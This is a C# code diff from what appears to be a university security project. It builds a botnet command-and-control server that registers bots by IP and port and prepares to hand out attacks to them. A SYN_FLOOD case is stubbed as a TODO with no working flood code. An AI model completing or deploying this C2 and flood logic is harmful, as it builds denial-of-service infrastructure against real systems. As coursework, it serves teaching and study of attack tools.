@@ -27,7 +27,7 @@ namespace Coms4507_Project.BotHandling
         private string ip;
 
         // These are attack status stuff.
-        public string attackType = "idle";
+        public string attackType{ get; set; }
         public string requestType = "status";
 
         private Dictionary<string, string> botIpPortDetails;
@@ -39,6 +39,7 @@ namespace Coms4507_Project.BotHandling
             Thread thread = new Thread(Listener);
             thread.Start();
             botIpPortDetails = new Dictionary<string, string>();
+            attackType = "none";
         }
 
         private void Listener()
@@ -59,19 +60,24 @@ namespace Coms4507_Project.BotHandling
                     string status = jData.GetValue("status").ToString();
                     string port = message["port"];
 
+                    // this is where the bots are assigned their IDs. It will be reassigned whenever a new IP is created.
                     botIpPortDetails[hostID] = ip + "::" + port;
                     Trace.WriteLine(botIpPortDetails.ToString());
-                    /*
-                     * TODO: Write in components here to extract information, identify which bot is which, then go through the list of IPs/port nums
-                     * being used by the bots to distribute out the code.
+                    /* 
                      * 
-                     * ID (ULTRASTEED) -> ip::port_num to communicate with. That way we can issue commands through a dictionary of bots.
+                     * WHEN THE C2 WANTS TO DISTRIBUTE AN ATTACK, IT WILL INDEPENDENTLY SEND OUT THOSE MESSAGES WITHOUT CHECKING FOR A RESPONSE,
+                     * IT WILL JUST DISTRIBUTE IT AND UPDATE THE STATUS ON THE NEXT STATUS LOOP BACK.
+                     * 
+                     * THE STATES OF THE BOTS WILL BE NOTICED AFTER ONE SUCCESSFUL LOOP OF THESE BOTS. THE BOTS WILL INDEPENDENTLY UPDATE,
+                     * SO THERE ARE NO CALLS REQUIRED BEYOND THE DISTRIBUTION OF AN ATTACK AND THEN CHECKING STATUS LIKE USUAL.
                      */
 
-                    // Build the status JObject here
+                    Trace.WriteLine(Check_For_Attack());
+
+                    // This is just the basic loop response. It just gets status about a bot.
                     Dictionary<string, object> data = new Dictionary<string, object>
                     {
-                        { "request", requestType },
+                        { "request", "status" },
                         { "attack", "none" },
                         { "targetIP", "none" },
                         { "ports", "[]" },
@@ -85,6 +91,18 @@ namespace Coms4507_Project.BotHandling
                     // We should just ignore it.
                     Trace.WriteLine(ex.Message);
                 }
+            }
+        }
+
+        public bool Check_For_Attack()
+        {
+            switch (requestType)
+            {
+                case "SYN_FLOOD":
+                    // TODO: Build the syn flood attack here, iterating through the list of attackers and issuing out attacks.
+                    return true;
+                default:
+                    return false;
             }
         }
 
